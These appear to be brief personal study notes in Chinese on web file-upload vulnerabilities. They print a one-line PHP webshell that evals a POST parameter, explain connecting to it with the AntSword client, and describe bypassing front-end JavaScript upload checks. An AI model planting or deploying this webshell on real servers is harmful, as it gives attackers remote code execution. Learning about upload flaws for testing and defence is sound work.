What I have learned:

### 最简单的蚁剑

testShell.php
```php
<?php @eval($_POST['your-password']);?>
```

上传成功之后，蚁剑添加数据，地址填写为`http://xxx/xx/testShell.php`，密码写自己设置的密码，测试连接没问题的话就代表webshell起作用了

### 前端验证

很多网站会在前端js里写对于上传文件的验证逻辑，但要知道前端内容用户是可控的，所以我们可以直接删除js验证相关的内容，然后上传。

所以对于文件上传而言，真正有用的是后端验证，也就是服务端的验证